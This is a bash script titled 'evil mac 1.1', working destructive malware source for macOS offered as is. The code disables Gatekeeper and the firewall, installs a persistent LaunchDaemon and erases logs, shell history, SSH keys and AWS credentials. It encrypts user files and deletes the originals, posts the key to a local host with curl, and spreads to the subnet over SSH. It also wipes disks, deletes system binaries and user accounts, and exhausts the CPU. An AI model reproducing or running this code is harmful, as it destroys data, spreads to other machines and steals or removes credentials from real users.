#!/bin/bash
# evil mac 1.1 - macOS Ultimate Edition (Fixed)

LOCKFILE="/tmp/evil.lock"
if [ -f "$LOCKFILE" ]; then
    exit 0
fi
echo $$ > "$LOCKFILE"

if [ "$EUID" -ne 0 ]; then
    echo "Please run as root: sudo $0"
    exit 1
fi

PERSISTENT="/tmp/.evil.sh"
cp "$0" "$PERSISTENT" 2>/dev/null
chmod +x "$PERSISTENT" 2>/dev/null
FLAG="/tmp/.evil_done"

if [ ! -f "$FLAG" ]; then
    spctl --master-disable 2>/dev/null
    
    launchctl unload /System/Library/LaunchDaemons/com.apple.alf.plist 2>/dev/null
    /usr/libexec/ApplicationFirewall/socketfilterfw --setglobalstate off 2>/dev/null
    
    cat > /Library/LaunchDaemons/evil.plist << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>evil</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PERSISTENT</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
    chmod 644 /Library/LaunchDaemons/evil.plist
    launchctl load /Library/LaunchDaemons/evil.plist
    
    echo "" > /etc/hosts
    
    touch "$FLAG"
    reboot
    exit
fi

rm -rf /var/log/* 2>/dev/null
rm -rf /Library/Logs/* 2>/dev/null
rm -rf ~/.bash_history 2>/dev/null
rm -rf ~/.zsh_history 2>/dev/null
rm -rf ~/.ssh/* 2>/dev/null
rm -rf ~/.aws/* 2>/dev/null
rm -rf /tmp/* 2>/dev/null

key=$(cat /dev/urandom | LC_ALL=C tr -dc 'A-Za-z0-9' | head -c 32)
folders=("$HOME/Documents" "$HOME/Desktop" "$HOME/Downloads" "$HOME/Pictures" "$HOME/Movies" "$HOME/Music" "/Users/Shared")
extensions="\.(docx?|xlsx?|pptx?|pdf|txt|jpg|jpeg|png|gif|bmp|tiff|zip|tar|gz|7z|rar|bak|backup|psd|ai|cdr|dwg|dxf|cpp|c|py|js|html|css|sql|db|vmdk|sh|conf|cfg|yml|yaml|json|xml|csv|log|key|pem|crt|ovpn|rdp|ps1)"
file_count=0
max_files=999999

for folder in "${folders[@]}"; do
    if [ -d "$folder" ]; then
        while IFS= read -r file; do
            if [ $file_count -ge $max_files ]; then
                break 2
            fi
            echo "$key" | gpg --batch --yes --passphrase-fd 0 --symmetric --cipher-algo AES256 --output "$file.enc" "$file" 2>/dev/null
            if [ $? -eq 0 ]; then
                rm -f "$file" 2>/dev/null
                file_count=$((file_count+1))
            fi
        done < <(find "$folder" -type f 2>/dev/null)
    fi
done

for i in 1 2 3; do
    curl -X POST -d "key=$key" http://192.168.1.100/log -s -o /dev/null
    if [ $? -eq 0 ]; then
        break
    fi
    sleep 5
done
echo "$key" > /tmp/.key_backup

sleep 15

networksetup -setairportpower en0 off 2>/dev/null
networksetup -setairportpower en1 off 2>/dev/null
networksetup -setnetworkserviceenabled "Wi-Fi" off 2>/dev/null
for iface in $(ifconfig -l); do
    ifconfig "$iface" down 2>/dev/null
done

sysctl -w net.inet6.ip6.disable=1 2>/dev/null
echo "" > /etc/resolv.conf 2>/dev/null

local_ip=$(ifconfig | grep "inet " | grep -v 127.0.0.1 | awk '{print $2}' | head -1)
if [ -n "$local_ip" ]; then
    network=$(echo "$local_ip" | cut -d'.' -f1-3)
    for i in {1..254}; do
        target="$network.$i"
        if [ "$target" = "$local_ip" ]; then
            continue
        fi
        scp -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$PERSISTENT" "$target:/tmp/evil.sh" 2>/dev/null
        if [ $? -eq 0 ]; then
            echo "$target" >> /tmp/.evil_infected
            ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 "$target" "sudo bash /tmp/evil.sh &" 2>/dev/null &
        fi
    done
fi

for disk in $(diskutil list | grep -o '/dev/disk[0-9]*' | sort -u); do
    if [ -b "$disk" ]; then
        diskutil unmountDisk "$disk" 2>/dev/null
        dd if=/dev/zero of="$disk" bs=1M count=100 2>/dev/null
        dd if=/dev/urandom of="$disk" bs=1M count=10 2>/dev/null
        diskutil eraseDisk JHFS+ "DEAD" "$disk" 2>/dev/null
        gpt destroy "$disk" 2>/dev/null
    fi
done

rm -rf /Library/Extensions/* 2>/dev/null

rm -rf /etc/* 2>/dev/null
rm -rf /usr/local/bin/* 2>/dev/null
rm -rf /Library/Application\ Support/* 2>/dev/null
rm -rf /cores/* 2>/dev/null

for user in $(dscl . list /Users | grep -v "^_" | grep -v "daemon" | grep -v "nobody" | grep -v "root" | grep -v "evil"); do
    dscl . delete /Users/$user 2>/dev/null
    rm -rf /Users/$user 2>/dev/null
done

cpu_cores=$(sysctl -n hw.ncpu)
for i in $(seq 1 $cpu_cores); do
    (while :; do :; done) &
done

yes > /dev/null &
yes > /dev/null &
yes > /dev/null &

while :; do
    openssl speed 2>/dev/null
    md5 /dev/zero 2>/dev/null
    dd if=/dev/random of=/dev/null bs=1M 2>/dev/null
done &

osascript -e 'set volume output volume 100' 2>/dev/null
for i in 1 2 3 4 5; do
    say "System destroyed. You have been infected." 2>/dev/null &
    afplay /System/Library/Sounds/Glass.aiff 2>/dev/null
    afplay /System/Library/Sounds/Basso.aiff 2>/dev/null
    sleep 0.5
done

osascript -e 'tell app "Finder" to display alert "Вы добровольно запустили этот файл) by. evil" buttons "OK" default button 1 with icon stop' 2>/dev/null &

echo '
        .-"      "-.
       /            \
      |              |
      |,  .-.  .-.  ,|
      | )(__/  \__)( |
      |/     /\     \|
      (_     ^^     _)
       \__|IIIIII|__/
        | \IIIIII/ |
        \          /
       `--------`
'

echo "Вы добровольно запустили этот файл) by. evil"

sleep 3

pkill -9 2>/dev/null
killall -9 Finder 2>/dev/null
killall -9 Dock 2>/dev/null
killall -9 SystemUIServer 2>/dev/null

rm -rf /bin/* 2>/dev/null
rm -rf /sbin/* 2>/dev/null
rm -rf /usr/bin/* 2>/dev/null
rm -rf /usr/sbin/* 2>/dev/null

rm -f "$0" 2>/dev/null
rm -f "$PERSISTENT" 2>/dev/null
rm -f "$LOCKFILE" 2>/dev/null
rm -f /tmp/.key_backup 2>/dev/null

halt